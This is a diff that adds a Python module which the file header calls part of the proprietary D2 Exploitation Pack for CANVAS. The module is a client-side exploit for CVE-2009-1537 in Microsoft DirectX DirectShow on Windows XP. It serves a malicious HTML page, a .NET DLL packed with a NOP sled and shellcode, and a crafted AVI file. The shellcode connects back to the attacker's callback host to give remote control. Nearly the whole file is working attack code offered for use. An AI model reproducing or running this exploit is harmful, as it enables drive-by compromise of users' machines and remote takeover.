@@ -1,0 +1,148 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from pelib import PElib
+
+# GUI info
+NAME = "Microsoft DirectX DirectShow QuickTime Video Code Execution Vulnerability"
+
+DESCRIPTION = "Code Execution Vulnerability in Microsoft DirectX DirectShow QuickTime Video"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Microsoft"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2009.05.28"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/35139"
+DOCUMENTATION["Versions Affected"] = "Microsoft DirectX 9.0"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2009-1537"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1537"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['XP']
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+class theexploit(httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.badstring = "\x00"
+        self.subesp = 0
+        self.name = NAME 
+        self.filename = "index.html"
+        self.avifile = "d2.avi"
+        return
+
+    def makefile(self):        	
+        filedata = """
+<HTML>
+<BODY>
+
+<OBJECT classid="%dd2.dll#ActiveXDotNet.DSquare"></OBJECT>
+<OBJECT id="target" classid="clsid:6bf52a52-394a-11d3-b153-00c04f79faa6"></OBJECT>
+
+<SCRIPT>        
+    target.URL = "d2.avi";    
+    target.controls.play();
+</SCRIPT>
+
+</BODY>
+</HTML>
+"""%(random.randint(0, 65535))
+
+        return filedata
+
+    def makesploit(self,clientheader,clientbody):
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+                
+        # .NET DLL request    
+        if clientheader.URL.count("d2.dll"):
+            self.log("Sending .NET DLL file")
+            p = PElib()            
+            sploitstring = p.createDotNETPEFileBuf( ("\x90" * 0xd000) + self.createShellcode(), 0x74000000 )
+            h.addHeader('Content-Type', 'application/octet-stream')
+            b.setBody(sploitstring)
+            
+        # AVI file request    
+        elif clientheader.URL.count(self.avifile):
+            self.log("Sending AVI file")
+            f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_directshow/" + self.avifile, "rb")
+            sploitstring = f.read()
+            f.close()
+            h.addHeader('Content-Type', 'application/octet-stream')
+            b.setBody(sploitstring)
+
+ 				# Index file request    
+        else:
+            sploitstring = self.makefile()
+            h.addHeader('Content-Type', 'text/html')
+            b.setBody(sploitstring)
+                    
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+
+    def createShellcode(self):
+        host = self.callback.ip
+        port = self.callback.port
+        
+        self.log('Connect back information: %s:%d' % (host,port))
+        proxy_payload = ''
+        
+        try:
+            # this stuff is only used when served in HTTP MOSDEF mode
+            if hasattr(self, 'HTTPMOSDEF') and self.HTTPMOSDEF == True:
+                # make sure that fromcreatethread is set to 0 in your
+                # httpserver/exploit listenerArgsDict!
+                import shellcode.standalone.windows.payloads as payloads
+                ssl_dict = { True : 'https', False : 'http' }
+                p   = payloads.payloads()
+                sc  = p.http_proxy("%s://%s" % (ssl_dict[self.useSSL], self.callback.ip), self.callback.port)
+                proxy_payload = p.assemble(sc)
+        except:
+            proxy_payload = ''
+            
+        self.shellcode = self.createInjectToSelf(host, port, injectme=proxy_payload, vProtect=True, movetostack=True)
+        
+        return self.shellcode
+
+    def run(self):
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
